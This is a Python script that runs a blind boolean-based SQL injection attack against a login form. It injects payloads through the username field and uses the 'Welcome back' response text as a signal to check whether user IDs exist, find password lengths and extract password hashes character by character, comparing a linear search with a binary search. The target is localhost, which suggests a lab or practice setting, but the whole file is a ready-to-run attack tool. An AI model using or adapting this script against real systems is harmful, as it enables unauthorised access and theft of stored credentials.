import requests

# Initialize total_queries counter and character set for hashing
total_queries = 0
charset = "0123456789abcdef"

# Target URL and needle for successful login identification
target = "http://127.0.0.1:8080"
needle = "Welcome back"

# Function to send an injected SQL query and check for successful login
def injected_query(payload):
    """
    Send an injected SQL query and return True if the needle is found in the response.
    """
    global total_queries  # Access the global total_queries counter
    r = requests.post(target, data={"username": "admin' or {}--".format(payload), "password": "password"})
    total_queries += 1
    return needle.encode() not in r.content

# Function to construct and send a boolean-based SQL query
def boolean_query(offset, user_id, character, operator=">"):
    """
    Construct and send a boolean-based SQL query.
    """
    payload = "(SELECT hex(substr(password,{},1)) FROM user WHERE id={}) {} hex('{}')".format(offset + 1, user_id, operator, character)
    return injected_query(payload)

# Function to check if the provided user ID exists
def invalid_user(user_id):
    """
    Check if the provided user ID exists.
    """
    payload = "(SELECT id FROM user WHERE id = {}) >= 0".format(user_id)
    return injected_query(payload)

# Function to determine the length of the password for the given user ID
def password_length(user_id):
    """
    Determine the length of the password for the given user ID.
    """
    i = 0
    while True:
        payload = "(SELECT length(password) FROM user WHERE id = {} AND length(password) <= {} limit 1)".format(user_id, i)
        if not injected_query(payload):
            return i
        i += 1

# Function to extract the password hash for the given user ID
def extract_hash(charset, user_id, password_length):
    """
    Extract the password hash for the given user ID.
    """
    found = ""
    # Iterate over password length
    for i in range(0, password_length):
        for j in range(len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found

# Binary search function to extract the password hash for the given user ID
def extract_hash_bst(charset, user_id, password_length):
    """
    Extract the password hash for the given user ID using binary search.
    """
    found = ""
    # Iterate over password length
    for index in range(0, password_length):
        start = 0
        end = len(charset) - 1
        while start <= end:
            if end - start == 1:
                if start == 0 and boolean_query(index, user_id, charset[start]):
                    found += charset[start]
                else:
                    found += charset[start + 1]
                break
            else:
                mid = (start + end) // 2
                if boolean_query(index, user_id, charset[mid]):
                    end = mid
                else:
                    start = mid
    return found 

# Function to print total queries made
def total_queries_reqd():
    """
    Print the total number of queries made.
    """
    global total_queries
    print("\t\t[!] {} total queries!".format(total_queries))
    total_queries = 0

# Main program execution
while True:
    try:
        user_id = input(">> Enter user ID to extract password hash: ")
        if not invalid_user(user_id):
            user_password_length = password_length(user_id)
            print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
            total_queries_reqd()
            print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_length)))
            total_queries_reqd()
            # Compare with binary search method
            print("\t[-] User {} hash: {}".format(user_id, extract_hash_bst(charset, int(user_id), user_password_length)))
            total_queries_reqd()
        else:
            print("\t[-] User {} does not exist!".format(user_id))
    except KeyboardInterrupt:
        break
